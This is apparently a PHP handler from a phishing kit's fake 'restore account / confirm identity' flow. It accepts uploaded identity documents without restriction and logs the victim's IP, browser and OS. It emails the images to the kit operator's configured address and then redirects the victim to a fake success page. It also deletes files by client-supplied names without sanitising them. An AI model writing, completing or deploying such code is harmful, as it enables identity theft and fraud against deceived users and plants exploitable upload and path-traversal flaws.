<?php
require __DIR__ . '/../function.php';
require __DIR__ . '/../system/class/fileuploader.php';

$FileUploader = new FileUploader("files", array(
    'limit' => null,
    'maxSize' => null,
    'fileMaxSize' => null,
    'extensions' => null,
    'required' => false,
    'uploadDir' => '../system/uploads/',
    'title' => 'name',
    'replace' => false,
    /* Image compress
    'editor' => array(
        'maxWidth' => 640,
        'maxHeight' => 480,
        'quality' => 90
    ),
    */
    'listInput' => true,
    'files' => null
));

foreach ($FileUploader->getRemovedFiles('file') as $key => $value) {
  unlink('../system/uploads/'.$value['name']);
}

$data = $FileUploader->upload();

if ($data['isSuccess'] && count($data['files']) > 0) {
  $subject = "[ {$api->location()['title']} | {$_SESSION['ip']} | {$_SESSION['browser']} - {$_SESSION['os']} ]";
  for ($i=0; $i < count($data['files']); $i++) {
    $img[$i] = $data[files][$i][file];
  }
  $api->save($api->logs("identity"), $subject."\n", "a");
  mail($api->result()['card'], $subject, "<html></html>", "IDENTITY", $img);
  $api->redirect("../restore/success");
} elseif ($data['hasWarnings']) {
  $api->redirect("../restore/confirm_identity");
} else {
  $api->redirect("../restore/confirm_identity");
}
?>
